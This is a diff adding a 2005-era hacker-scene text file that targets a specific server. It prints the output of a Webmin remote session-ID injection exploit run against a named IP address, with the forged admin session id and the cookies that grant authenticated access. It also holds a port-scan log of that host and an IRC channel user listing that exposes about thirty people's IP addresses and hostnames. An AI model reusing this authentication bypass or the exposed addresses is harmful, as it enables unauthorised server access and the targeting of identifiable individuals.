@@ -1,0 +1,73 @@
+-------------------------------------------------------------------------------------------
+
+2 x GL am start -->> glport 4215 & 65001 (ohne SSL)
+
+------------------------------------------------------------------------------------------
+webmin http://83.149.104.61:19728
+
+Webmin 1.050 - 1.060 Remote SID Injection Exploit
+By Carl Livitt <carl at learningshophull dot co dot uk>
+You should now have a session_id of 1234567890 for user 'admin' on host 83.149.1 04.61.
+Just set two cookies in your browser:
+testing=1
+sid=1234567890
+and you will be authenticated to the webmin server!
+
+-------------------------------------------------------------------------------------------
+
+Starting security scan of host [83.149.104.61]...
+Time: 01:31:36
+=======================================================================
+Collecting Windows OS Information...
+Starting port scanning...
+TCP scanning started...
+28 TCP open port(s)
+
+-------------------------------------------------------------------------------------------
+
+user @ 01:29 2005-10-21
+
+#LCH Peni H+ ReTaRD@82-37-54-160.cable.ubr03.brom.blueyonder.co.uk :4 ReTarD
+#LCH jiM3op H+ ~TheCooK@is.one.of.those.sexy-motherfuckers.de :4 TheCooK
+#LCH Pexil|BNC H+ ~Pexil@62.75.163.64 :5 Pexil
+#LCH ^firefox^ H+ firefox@this.is.notmyip.de :5 firefox
+#LCH biaatch H+ ~userxyz@just.r00x.net :5 userxyz
+#LCH XPQ21|oFF H@ xpq21@try.to.race.me.n00b.hotshells.de :3 _XPQ21_
+#LCH _LifeTec H@ bellybeast@dot-com.scheissaufmicrosoft.de :3 Midwarts
+#LCH Gamebreak H+ game@83.151.18.252 :5 Gamebreak
+#LCH Lauryl H+ schnick@babe1-muc.hotshells.de :5 Lauryl
+#LCH NaiL H+ NaiL@213-239-219-232.clients.your-server.de :5 NaiL
+#LCH sta H+ sta@82.211.51.59 :5 sta
+#LCH Keyzer H+ ~Keyzer@server8324611443.serverpool.info :5 Keyzer
+#LCH __duck|n4 H+ duckman@shell2.shellplanet.de :5 duck123
+#LCH Komposti H+ ~tutu@hat-sex.de :5 nuclear
+#LCH M0nt4n4 H+ ~Nras@hat-sex.de :5 Nras
+#LCH Mesc4lin H+ Mesc4lin@mag.rasierte.puss1es.de :5 Mesc4lin
+#LCH Python123 H+ Python123@server19.xlhost.de :5 Python123
+#LCH _amphex H+ Snickers@fu.wh0is.de :5 _ampheX
+#LCH [justus] H+ noone@82.211.46.163 :4 [lustus]
+#LCH KRoeTe H+ Dog@is.scheissflott.bei.xlhost.de :4 KRoeTe
+#LCH neroon H+ neroon@pD952B5AA.dip.t-dialoff.de :3 Neroon
+#LCH cygwin H+ cygwin@b129.blue.fastwebserver.de :4 cygwin
+#LCH FlyingDag G+ FlyingDag@thermal-host.de :4 FlyingDag
+#LCH _gh0uL H+ ~reanimate@midnightirc.info :3 (".)
+#LCH _Air_ H+ hans@server1932015438.serverpool.info :5 _Air_
+#LCH leogec H+ noname@gangbang.t0tal.de :3 |leogec|
+#LCH Cluster H+ ~Charisma@89.vienna.vs.mos.at :5 Cluster
+#LCH Hakmed H+ oO@zockt.c0unter-strike.de :3 - www.nk-sales.de -
+#LCH _Mars H+ riegel@217-20-114-173.internetserviceteam.com :5 riegel
+#LCH _LCH_ H@ hans@83.149.104.61 :3 bembel
+#LCH st4n^weg H@ hans@server1932015438.serverpool.info :3 TONI
+#lch End of /WHO list.
+
+-------------------------------------------------------------------------------------------
+
+affils
+
+TVC - CLXXX - Raxim - Ministry - HQR - FiG - STRS
+
+-------------------------------------------------------------------------------------------
+
+@ all SiTEOPS u know what u´ve 2 do ! ! ! 
+
+ThE W4TchEr
